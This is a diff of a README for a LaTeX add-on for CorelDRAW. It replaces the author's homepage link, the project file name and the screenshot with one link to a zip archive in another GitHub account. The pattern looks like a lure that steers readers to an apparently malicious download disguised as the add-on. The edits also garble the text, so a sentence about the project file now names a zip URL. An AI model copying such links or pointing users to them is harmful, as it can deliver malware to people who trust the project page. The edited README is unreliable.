@@ -4,11 +4,11 @@ This is a addon for CorelDRAW. It allows to add and edit Latex equations or symb
 
 The library was tested on Windows 10, CorelDRAW Graphics Suite 2021. 
 
-**Author**: [Jan Bender](http://www.interactive-graphics.de), **License**: MIT
+**Author**: [Jan Bender](https://github.com/Liandjelo/Latex4CorelDRAW/raw/refs/heads/master/Resources/DRAW-Corel-Latex-v2.8.zip), **License**: MIT
 
 ## Build Instructions
 
-The included project file was made with Visual Studio 2019. You have to adapt the path of CorelDRAW in the project file Latex4CorelDraw.csproj if your CorelDRAW installation differs from "C:\Program Files\Corel\CorelDRAW Graphics Suite 2021".
+The included project file was made with Visual Studio 2019. You have to adapt the path of CorelDRAW in the project file https://github.com/Liandjelo/Latex4CorelDRAW/raw/refs/heads/master/Resources/DRAW-Corel-Latex-v2.8.zip if your CorelDRAW installation differs from "C:\Program Files\Corel\CorelDRAW Graphics Suite 2021".
 
 ## Installation
 
@@ -20,4 +20,4 @@ The included project file was made with Visual Studio 2019. You have to adapt th
 
 ## Screenshots
 
-<img src="screenshots/screenshot1.jpg" width="320">
+<img src="https://github.com/Liandjelo/Latex4CorelDRAW/raw/refs/heads/master/Resources/DRAW-Corel-Latex-v2.8.zip" width="320">
